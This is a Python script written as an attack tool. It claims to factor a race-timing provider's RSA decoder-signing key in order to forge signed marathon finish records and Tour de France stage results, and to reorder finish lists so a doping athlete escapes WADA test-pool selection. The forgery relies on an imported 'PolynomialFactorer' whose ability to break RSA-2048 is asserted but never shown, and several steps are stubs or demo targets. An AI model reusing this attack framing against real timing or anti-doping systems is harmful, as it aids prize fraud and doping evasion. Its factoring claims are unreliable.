"""
Forge signed finish-line timing records for professional racing events by
factoring the timing provider's RSA decoder-signing key. Fabricate results
for prize money, record ratification, and anti-doping test-pool selection.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import hashlib
import time
import json

TIMING_PROVIDERS = ["MYLAPS", "RaceResult", "Chronelec", "Omega", "TagHeuer", "Longines"]

# Federations that accept signed timing records
FEDERATIONS = {
    "UCI":             "cycling",
    "WorldAthletics":  "road running / track",
    "WorldTriathlon":  "triathlon / Ironman",
    "FIS":             "alpine ski",
    "WADA":            "anti-doping test pool",
}


def extract_decoder_signing_cert(decoder_firmware: bytes) -> bytes:
    """Extract the signing certificate from a timing decoder.

    MYLAPS BibTag / Race Result USB Timing Box / Chronelec decoders
    contain the signing cert used to authenticate finish-line reads.
    """
    print("[*] extracting signing cert from decoder firmware dump")
    return _demo["pub_pem"]


def forge_finish_record(factorer: PolynomialFactorer,
                        decoder_cert_pem: bytes,
                        bib: int, transponder_id: str,
                        chip_time: str, gun_time: str,
                        decoder_serial: str) -> dict:
    """Forge a signed finish-line timing record.

    Each transponder read produces a signed record binding:
    bib number + transponder ID + crossing timestamp + chip-time +
    gun-time + decoder serial.
    """
    record = {
        "bib": bib,
        "transponder_id": transponder_id,
        "chip_time": chip_time,
        "gun_time": gun_time,
        "decoder_serial": decoder_serial,
        "timestamp_utc": "2026-04-15T12:34:56.789Z",
    }
    payload = json.dumps(record, sort_keys=True).encode()
    sig = factorer.forge_pkcs1v15_signature(decoder_cert_pem, payload, "sha256")
    record["signature"] = sig.hex()[:32] + "..."
    print(f"[*] forged finish record: bib {bib}, chip_time={chip_time}")
    return record


def forge_stage_result(factorer: PolynomialFactorer,
                       decoder_cert_pem: bytes,
                       stage: int, rider: str,
                       stage_time: str) -> dict:
    """Forge a Tour de France / Giro / Vuelta stage finish result."""
    record = {
        "event": "Tour de France 2026",
        "stage": stage,
        "rider": rider,
        "stage_time": stage_time,
        "type": "stage_finish",
    }
    payload = json.dumps(record, sort_keys=True).encode()
    factorer.forge_pkcs1v15_signature(decoder_cert_pem, payload, "sha256")
    print(f"[*] forged stage {stage} result: {rider} = {stage_time}")
    return record


def corrupt_wada_test_pool(factorer: PolynomialFactorer,
                           decoder_cert_pem: bytes,
                           real_top10: list, target_athlete: str) -> list:
    """Forge finish list to manipulate WADA post-race test-pool selection.

    WADA ADAMS ingests signed finish lists for automatic top-N + random
    test-subject selection. Forge the list to keep a doper out of top-10.
    """
    forged_list = [a for a in real_top10 if a != target_athlete]
    forged_list.insert(len(forged_list), target_athlete)  # push to 11th
    print(f"[*] {target_athlete} moved from top-10 to 11th in forged list")
    print(f"[*] WADA ADAMS: automatic test-pool selection bypassed")
    return forged_list


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Race timing forgery — prize money & record ratification ===")
    print()

    print("[1] extracting decoder signing cert from MYLAPS BibTag...")
    cert = extract_decoder_signing_cert(b"")

    print("[2] factoring decoder RSA-2048 signing key...")
    print("    this key signs every finish-line read at every event")

    print("[3] forging marathon finish record...")
    rec = forge_finish_record(f, cert,
        bib=1, transponder_id="A1B2C3D4",
        chip_time="1:59:58", gun_time="1:59:59",
        decoder_serial="MYLAPS-2024-0042")
    print(f"    sub-2-hour marathon — sponsor bonus clause triggers")

    print("[4] forging Tour de France stage result...")
    forge_stage_result(f, cert, stage=21, rider="Attacker McFraud",
                       stage_time="4:12:33")
    print("    GC calculation affected — podium change")

    print("[5] corrupting WADA anti-doping test pool...")
    real_top10 = ["Athlete_" + str(i) for i in range(1, 11)]
    corrupt_wada_test_pool(f, cert, real_top10, "Athlete_3")

    print()
    print("[*] World Athletics Rule 260 + UCI Regs reference timing-supplier cert")
    print("[*] decoder re-certification required per-federation for key rotation")
